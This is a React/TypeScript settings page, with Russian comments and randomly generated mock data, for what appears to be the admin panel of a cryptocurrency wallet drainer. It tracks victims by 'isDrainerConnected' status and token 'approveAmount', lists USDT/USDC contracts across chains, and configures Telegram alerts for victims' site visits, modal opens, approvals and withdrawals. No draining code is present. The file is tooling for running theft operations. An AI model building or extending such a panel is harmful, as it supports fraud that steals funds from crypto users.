import React, { useState } from 'react';
import { Bot, MessageSquare, Key, AlertTriangle, Save, Eye, EyeOff, Search, ArrowLeft, Settings as SettingsIcon, Wallet, Users, Package } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { Link } from 'react-router-dom';

interface Network {
  id: string;
  name: string;
  symbol: string;
  color: string;
}

interface Contract {
  id: string;
  name: string;
  address: string;
  network: Network;
  token: string;
  balance: number;
  usdBalance: number;
}

interface User {
  id: string;
  walletAddress: string;
  balance: {
    token: string;
    amount: number;
    usd: number;
  };
  isDrainerConnected: boolean;
  approveAmount: number;
  isPinned: boolean;
}

interface Project {
  id: string;
  name: string;
  walletAddress: string;
  contracts: Contract[];
  users: User[];
}

interface ProjectSettings {
  projectId: string;
  telegramSettings: {
    botApiKey: string;
    chatId: string;
    username: string;
  };
  notifications: {
    siteAccess: boolean;
    modalOpens: boolean;
    withdrawals: boolean;
    approvals: boolean;
  };
  security: {
    requirePassword: boolean;
    password: string;
    enableLogging: boolean;
    autoBackup: boolean;
  };
}

// Глобальные настройки безопасности - отдельно от проектов
interface GlobalSecuritySettings {
  masterPassword: {
    current: string;
    new: string;
    confirm: string;
  };
  twoFactorAuth: boolean;
  sessionTimeout: number;
  loginAttempts: number;
}

const Settings = () => {
  const networks: Network[] = [
    { id: 'eth', name: 'Ethereum', symbol: 'ETH', color: '#627EEA' },
    { id: 'bsc', name: 'BSC', symbol: 'BNB', color: '#F3BA2F' },
    { id: 'polygon', name: 'Polygon', symbol: 'MATIC', color: '#8247E5' },
    { id: 'arbitrum', name: 'Arbitrum', symbol: 'ARB', color: '#28A0F0' }
  ];

  // Генератор проектов (тот же что и в других компонентах)
  const generateProjects = (count: number): Project[] => {
    const projectNames = [
      'DD', 'XProject', 'CryptoFlow', 'DefiMaster', 'TokenVault', 'ChainLink', 
      'MetaSwap', 'EtherBridge', 'PolyDex', 'ArbiTrade', 'BSCVault', 'UniFlow',
      'PancakeBot', 'SushiDrain', 'CurveMax', 'BalancerPro', 'CompoundX', 'AaveFlow',
      'YearnVault', 'SynthetixBot', 'MakerDAO', 'USDCVault', 'TetherMax', 'BinanceChain'
    ];

    const tokens = ['USDT', 'USDC'];

    return Array.from({ length: count }, (_, i) => {
      const projectName = projectNames[i % projectNames.length] + (i >= projectNames.length ? ` ${Math.floor(i / projectNames.length) + 1}` : '');
      
      const contractCount = Math.floor(Math.random() * 6) + 2;
      const contracts: Contract[] = [];
      
      for (let j = 0; j < contractCount; j++) {
        const network = networks[Math.floor(Math.random() * networks.length)];
        const token = tokens[Math.floor(Math.random() * tokens.length)];
        const balance = Math.random() * 10000;
        
        contracts.push({
          id: `c${i}_${j}`,
          name: `${token} Contract (${network.name})`,
          address: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
          network,
          token,
          balance,
          usdBalance: balance * (token === 'USDT' ? 1 : 0.999)
        });
      }

      const userCount = Math.floor(Math.random() * 15) + 1;
      const users: User[] = Array.from({ length: userCount }, (_, k) => {
        const userToken = tokens[Math.floor(Math.random() * tokens.length)];
        const tokenAmount = Math.random() * 5000 + 100;
        const usdValue = tokenAmount * (userToken === 'USDT' ? 1 : 0.999);
        
        return {
          id: `user${i}_${k}`,
          walletAddress: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
          balance: {
            token: userToken,
            amount: tokenAmount,
            usd: usdValue
          },
          isDrainerConnected: Math.random() > 0.2,
          approveAmount: Math.random() * 5000,
          isPinned: Math.random() > 0.8
        };
      });

      return {
        id: (i + 1).toString(),
        name: projectName,
        walletAddress: `0x${Math.random().toString(16).slice(2, 10)}...${Math.random().toString(16).slice(2, 6)}`,
        contracts,
        users
      };
    });
  };

  const [projects] = useState<Project[]>(generateProjects(24));
  const [selectedProject, setSelectedProject] = useState<Project | null>(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [showApiKey, setShowApiKey] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [showGlobalSecurity, setShowGlobalSecurity] = useState(false);

  // Настройки для каждого проекта
  const [projectSettings, setProjectSettings] = useState<{ [key: string]: ProjectSettings }>(() => {
    const settings: { [key: string]: ProjectSettings } = {};
    projects.forEach(project => {
      settings[project.id] = {
        projectId: project.id,
        telegramSettings: {
          botApiKey: '',
          chatId: '',
          username: ''
        },
        notifications: {
          siteAccess: true,
          modalOpens: true,
          withdrawals: true,
          approvals: true
        },
        security: {
          requirePassword: false,
          password: '',
          enableLogging: true,
          autoBackup: false
        }
      };
    });
    return settings;
  });

  // Глобальные настройки безопасности - ТОЛЬКО ОДНИ для всей системы
  const [globalSecurity, setGlobalSecurity] = useState<GlobalSecuritySettings>({
    masterPassword: {
      current: '',
      new: '',
      confirm: ''
    },
    twoFactorAuth: false,
    sessionTimeout: 30, // минуты
    loginAttempts: 3
  });

  const filteredProjects = projects.filter(project =>
    project.name.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const handleSaveProjectSettings = (projectId: string) => {
    console.log('Saving settings for project:', projectId, projectSettings[projectId]);
    // Здесь будет логика сохранения настроек проекта
  };

  const handleSaveGlobalSecurity = () => {
    if (globalSecurity.masterPassword.new !== globalSecurity.masterPassword.confirm) {
      console.error('Passwords do not match');
      return;
    }
    console.log('Saving global security settings:', globalSecurity);
    // Здесь будет логика сохранения глобальных настроек безопасности
  };

  const handleNotificationToggle = (projectId: string, key: keyof ProjectSettings['notifications']) => {
    setProjectSettings(prev => ({
      ...prev,
      [projectId]: {
        ...prev[projectId],
        notifications: {
          ...prev[projectId].notifications,
          [key]: !prev[projectId].notifications[key]
        }
      }
    }));
  };

  const handleSecurityToggle = (projectId: string, key: keyof ProjectSettings['security']) => {
    setProjectSettings(prev => ({
      ...prev,
      [projectId]: {
        ...prev[projectId],
        security: {
          ...prev[projectId].security,
          [key]: !prev[projectId].security[key]
        }
      }
    }));
  };

  const updateTelegramSettings = (projectId: string, field: keyof ProjectSettings['telegramSettings'], value: string) => {
    setProjectSettings(prev => ({
      ...prev,
      [projectId]: {
        ...prev[projectId],
        telegramSettings: {
          ...prev[projectId].telegramSettings,
          [field]: value
        }
      }
    }));
  };

  const updateSecurityPassword = (projectId: string, password: string) => {
    setProjectSettings(prev => ({
      ...prev,
      [projectId]: {
        ...prev[projectId],
        security: {
          ...prev[projectId].security,
          password
        }
      }
    }));
  };

  const getTotalUsdValue = (project: Project) => {
    return project.contracts.reduce((sum, contract) => sum + contract.usdBalance, 0);
  };

  // Если показываем глобальные настройки безопасности
  if (showGlobalSecurity) {
    return (
      <div className="max-w-4xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <button
              onClick={() => setShowGlobalSecurity(false)}
              className="flex items-center gap-2 px-3 py-2 bg-[#1e1f25] rounded-lg hover:bg-[#2a2b33] transition-colors"
            >
              <ArrowLeft size={20} />
              Back to Settings
            </button>
            <div>
              <h1 className="text-2xl font-bold text-red-400">Global Security</h1>
              <p className="text-gray-400 mt-1">System-wide security settings</p>
            </div>
          </div>
          <motion.button
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={handleSaveGlobalSecurity}
            className="flex items-center gap-2 px-4 py-2 bg-red-400 text-white rounded-lg hover:bg-red-500 transition-colors"
          >
            <Save size={20} />
            Save Global Settings
          </motion.button>
        </div>

        {/* Master Password */}
        <div className="bg-[#1e1f25] rounded-lg p-6">
          <div className="flex items-center gap-2 mb-6">
            <Key className="text-red-400" size={24} />
            <h2 className="text-xl font-semibold">Master Password</h2>
          </div>

          <div className="bg-red-400/10 border border-red-400/20 rounded-lg p-6">
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-400 mb-2">
                  Current Master Password
                </label>
                <input
                  type="password"
                  value={globalSecurity.masterPassword.current}
                  onChange={(e) => setGlobalSecurity(prev => ({
                    ...prev,
                    masterPassword: { ...prev.masterPassword, current: e.target.value }
                  }))}
                  className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
                  placeholder="Enter current master password"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-400 mb-2">
                  New Master Password
                </label>
                <input
                  type="password"
                  value={globalSecurity.masterPassword.new}
                  onChange={(e) => setGlobalSecurity(prev => ({
                    ...prev,
                    masterPassword: { ...prev.masterPassword, new: e.target.value }
                  }))}
                  className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
                  placeholder="Enter new master password"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-400 mb-2">
                  Confirm New Master Password
                </label>
                <input
                  type="password"
                  value={globalSecurity.masterPassword.confirm}
                  onChange={(e) => setGlobalSecurity(prev => ({
                    ...prev,
                    masterPassword: { ...prev.masterPassword, confirm: e.target.value }
                  }))}
                  className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
                  placeholder="Confirm new master password"
                />
              </div>
            </div>
          </div>
        </div>

        {/* System Security Settings */}
        <div className="bg-[#1e1f25] rounded-lg p-6">
          <div className="flex items-center gap-2 mb-6">
            <AlertTriangle className="text-red-400" size={24} />
            <h2 className="text-xl font-semibold">System Security</h2>
          </div>

          <div className="space-y-4">
            <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
              <div>
                <div className="font-medium">Two-Factor Authentication</div>
                <div className="text-sm text-gray-400">Enable 2FA for additional security</div>
              </div>
              <label className="relative inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  className="sr-only peer"
                  checked={globalSecurity.twoFactorAuth}
                  onChange={(e) => setGlobalSecurity(prev => ({
                    ...prev,
                    twoFactorAuth: e.target.checked
                  }))}
                />
                <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-red-400"></div>
              </label>
            </div>

            <div className="p-3 bg-[#2a2b33] rounded-lg">
              <div className="flex items-center justify-between mb-3">
                <div>
                  <div className="font-medium">Session Timeout</div>
                  <div className="text-sm text-gray-400">Auto-logout after inactivity</div>
                </div>
              </div>
              <select
                value={globalSecurity.sessionTimeout}
                onChange={(e) => setGlobalSecurity(prev => ({
                  ...prev,
                  sessionTimeout: parseInt(e.target.value)
                }))}
                className="w-full bg-[#1e1f25] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
              >
                <option value={15}>15 minutes</option>
                <option value={30}>30 minutes</option>
                <option value={60}>1 hour</option>
                <option value={120}>2 hours</option>
                <option value={240}>4 hours</option>
                <option value={0}>Never</option>
              </select>
            </div>

            <div className="p-3 bg-[#2a2b33] rounded-lg">
              <div className="flex items-center justify-between mb-3">
                <div>
                  <div className="font-medium">Failed Login Attempts</div>
                  <div className="text-sm text-gray-400">Lock account after failed attempts</div>
                </div>
              </div>
              <select
                value={globalSecurity.loginAttempts}
                onChange={(e) => setGlobalSecurity(prev => ({
                  ...prev,
                  loginAttempts: parseInt(e.target.value)
                }))}
                className="w-full bg-[#1e1f25] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-red-400"
              >
                <option value={3}>3 attempts</option>
                <option value={5}>5 attempts</option>
                <option value={10}>10 attempts</option>
                <option value={0}>Unlimited</option>
              </select>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (!selectedProject) {
    return (
      <div className="max-w-7xl mx-auto space-y-6">
        <div className="flex justify-between items-center">
          <div>
            <h1 className="text-2xl font-bold">Project Settings</h1>
            <p className="text-gray-400 mt-1">Configure unique settings for each project</p>
          </div>
          
          {/* Global Security Button */}
          <motion.button
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={() => setShowGlobalSecurity(true)}
            className="flex items-center gap-2 px-4 py-2 bg-red-400 text-white rounded-lg hover:bg-red-500 transition-colors"
          >
            <AlertTriangle size={20} />
            Global Security
          </motion.button>
        </div>

        {/* Search */}
        <div className="relative">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
          <input
            type="text"
            placeholder="Search projects..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full bg-[#1e1f25] border border-gray-700 rounded-lg py-3 pl-10 pr-4 text-white focus:outline-none focus:ring-1 focus:ring-green-500"
          />
        </div>

        {searchTerm && (
          <div className="text-sm text-gray-400">
            Found {filteredProjects.length} projects matching "{searchTerm}"
          </div>
        )}

        {/* Projects Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
          {filteredProjects.map(project => (
            <motion.button
              key={project.id}
              whileHover={{ scale: 1.02, y: -5 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => setSelectedProject(project)}
              className="relative overflow-hidden p-6 rounded-xl text-center transition-all duration-300 bg-[#1e1f25] text-white hover:shadow-lg hover:shadow-[#2a2b33]/20 group"
            >
              {/* Background Pattern */}
              <div className="absolute inset-0 opacity-10 bg-gradient-to-br from-green-400/20 to-transparent" />
              
              {/* Content */}
              <div className="relative z-10">
                <div className="font-bold text-xl mb-4 truncate" title={project.name}>
                  {project.name}
                </div>
                
                <div className="flex flex-col items-center gap-3">
                  {/* Settings Icon */}
                  <div className="w-16 h-16 rounded-full bg-gradient-to-br from-green-400/20 to-green-500/20 flex items-center justify-center mb-2 transition-transform duration-300 group-hover:rotate-180">
                    <SettingsIcon size={32} className="text-green-400" />
                  </div>
                  
                  <div>
                    <div className="font-medium text-lg">Configure Settings</div>
                    <div className="text-sm opacity-75">Telegram • Notifications • Security</div>
                  </div>
                </div>

                <div className="mt-4 pt-4 border-t border-gray-700/30 space-y-2">
                  <div className="flex items-center justify-center gap-2">
                    <Package size={16} />
                    <span>{project.contracts.length} contracts</span>
                  </div>
                  <div className="flex items-center justify-center gap-2">
                    <Users size={16} />
                    <span>{project.users.length} users</span>
                  </div>
                  <div className="text-sm opacity-75">
                    Total Value: ${getTotalUsdValue(project).toLocaleString()}
                  </div>
                  {/* Показываем топ токены */}
                  <div className="flex justify-center gap-2 mt-2">
                    {Array.from(new Set(project.contracts.map(c => c.token))).map(token => (
                      <div
                        key={token}
                        className="px-2 py-1 bg-[#2a2b33] rounded-full text-xs"
                      >
                        {token}
                      </div>
                    ))}
                  </div>
                </div>

                {/* Hover Arrow */}
                <div className="absolute top-4 right-4 opacity-0 group-hover:opacity-100 transition-opacity">
                  <SettingsIcon size={20} className="text-green-400" />
                </div>
              </div>
            </motion.button>
          ))}
        </div>

        {/* Показываем сообщение если нет результатов поиска */}
        {filteredProjects.length === 0 && searchTerm && (
          <div className="text-center py-12">
            <div className="text-gray-400 text-lg mb-2">No projects found</div>
            <div className="text-gray-500">Try adjusting your search terms</div>
          </div>
        )}
      </div>
    );
  }

  const currentSettings = projectSettings[selectedProject.id];

  return (
    <div className="max-w-4xl mx-auto space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <button
            onClick={() => setSelectedProject(null)}
            className="flex items-center gap-2 px-3 py-2 bg-[#1e1f25] rounded-lg hover:bg-[#2a2b33] transition-colors"
          >
            <ArrowLeft size={20} />
            Back to Projects
          </button>
          <div>
            <h1 className="text-2xl font-bold">{selectedProject.name} Settings</h1>
            <p className="text-gray-400 mt-1">Configure project-specific settings</p>
          </div>
        </div>
        <motion.button
          whileHover={{ scale: 1.02 }}
          whileTap={{ scale: 0.98 }}
          onClick={() => handleSaveProjectSettings(selectedProject.id)}
          className="flex items-center gap-2 px-4 py-2 bg-green-400 text-[#1e1f25] rounded-lg hover:bg-green-500 transition-colors"
        >
          <Save size={20} />
          Save Settings
        </motion.button>
      </div>

      {/* Project Overview */}
      <div className="bg-[#1e1f25] rounded-lg p-6">
        <div className="flex items-center gap-2 mb-4">
          <Wallet className="text-green-400" size={24} />
          <h2 className="text-xl font-semibold">Project Overview</h2>
        </div>
        
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="bg-[#2a2b33] p-4 rounded-lg">
            <div className="text-sm text-gray-400 mb-1">Wallet Address</div>
            <div className="font-mono text-sm">{selectedProject.walletAddress}</div>
          </div>
          <div className="bg-[#2a2b33] p-4 rounded-lg">
            <div className="text-sm text-gray-400 mb-1">Total Value</div>
            <div className="text-xl font-bold">${getTotalUsdValue(selectedProject).toLocaleString()}</div>
          </div>
          <div className="bg-[#2a2b33] p-4 rounded-lg">
            <div className="text-sm text-gray-400 mb-1">Users</div>
            <div className="text-xl font-bold">{selectedProject.users.length}</div>
          </div>
        </div>
      </div>

      {/* Telegram Settings */}
      <div className="bg-[#1e1f25] rounded-lg p-6">
        <div className="flex items-center gap-2 mb-6">
          <Bot className="text-green-400" size={24} />
          <h2 className="text-xl font-semibold">Telegram Settings</h2>
        </div>

        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-400 mb-2">
              Bot API Key
            </label>
            <div className="relative">
              <input
                type={showApiKey ? 'text' : 'password'}
                value={currentSettings.telegramSettings.botApiKey}
                onChange={(e) => updateTelegramSettings(selectedProject.id, 'botApiKey', e.target.value)}
                className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 pl-4 pr-10 text-white focus:outline-none focus:ring-1 focus:ring-green-500"
                placeholder="Enter bot API key for this project"
              />
              <button
                onClick={() => setShowApiKey(!showApiKey)}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
              >
                {showApiKey ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-400 mb-2">
              Chat ID
            </label>
            <input
              type="text"
              value={currentSettings.telegramSettings.chatId}
              onChange={(e) => updateTelegramSettings(selectedProject.id, 'chatId', e.target.value)}
              className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-green-500"
              placeholder="Enter chat ID for this project"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-400 mb-2">
              Username
            </label>
            <input
              type="text"
              value={currentSettings.telegramSettings.username}
              onChange={(e) => updateTelegramSettings(selectedProject.id, 'username', e.target.value)}
              className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 px-4 text-white focus:outline-none focus:ring-1 focus:ring-green-500"
              placeholder="Enter Telegram username for this project"
            />
          </div>
        </div>
      </div>

      {/* Notification Settings */}
      <div className="bg-[#1e1f25] rounded-lg p-6">
        <div className="flex items-center gap-2 mb-6">
          <MessageSquare className="text-green-400" size={24} />
          <h2 className="text-xl font-semibold">Notification Settings</h2>
        </div>

        <div className="space-y-4">
          <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
            <span>Site Access Notifications</span>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={currentSettings.notifications.siteAccess}
                onChange={() => handleNotificationToggle(selectedProject.id, 'siteAccess')}
              />
              <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-400"></div>
            </label>
          </div>

          <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
            <span>Modal Window Opens</span>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={currentSettings.notifications.modalOpens}
                onChange={() => handleNotificationToggle(selectedProject.id, 'modalOpens')}
              />
              <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-400"></div>
            </label>
          </div>

          <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
            <span>Withdrawal Notifications</span>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={currentSettings.notifications.withdrawals}
                onChange={() => handleNotificationToggle(selectedProject.id, 'withdrawals')}
              />
              <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-400"></div>
            </label>
          </div>

          <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
            <span>Approval Notifications</span>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={currentSettings.notifications.approvals}
                onChange={() => handleNotificationToggle(selectedProject.id, 'approvals')}
              />
              <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-400"></div>
            </label>
          </div>
        </div>
      </div>

      {/* Project Security Settings */}
      <div className="bg-[#1e1f25] rounded-lg p-6">
        <div className="flex items-center gap-2 mb-6">
          <Key className="text-green-400" size={24} />
          <h2 className="text-xl font-semibold">Project Security</h2>
        </div>

        <div className="space-y-4">
          <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
            <div>
              <div className="font-medium">Password Protection</div>
              <div className="text-sm text-gray-400">Require password for project access</div>
            </div>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={currentSettings.security.requirePassword}
                onChange={() => handleSecurityToggle(selectedProject.id, 'requirePassword')}
              />
              <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-400"></div>
            </label>
          </div>

          {currentSettings.security.requirePassword && (
            <div>
              <label className="block text-sm font-medium text-gray-400 mb-2">
                Project Password
              </label>
              <div className="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={currentSettings.security.password}
                  onChange={(e) => updateSecurityPassword(selectedProject.id, e.target.value)}
                  className="w-full bg-[#2a2b33] border border-gray-700 rounded-lg py-2 pl-4 pr-10 text-white focus:outline-none focus:ring-1 focus:ring-green-500"
                  placeholder="Enter project password"
                />
                <button
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
            </div>
          )}

          <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
            <div>
              <div className="font-medium">Enable Logging</div>
              <div className="text-sm text-gray-400">Log all project activities</div>
            </div>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={currentSettings.security.enableLogging}
                onChange={() => handleSecurityToggle(selectedProject.id, 'enableLogging')}
              />
              <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-400"></div>
            </label>
          </div>

          <div className="flex items-center justify-between p-3 bg-[#2a2b33] rounded-lg">
            <div>
              <div className="font-medium">Auto Backup</div>
              <div className="text-sm text-gray-400">Automatically backup project data</div>
            </div>
            <label className="relative inline-flex items-center cursor-pointer">
              <input
                type="checkbox"
                className="sr-only peer"
                checked={currentSettings.security.autoBackup}
                onChange={() => handleSecurityToggle(selectedProject.id, 'autoBackup')}
              />
              <div className="w-11 h-6 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-green-400"></div>
            </label>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Settings;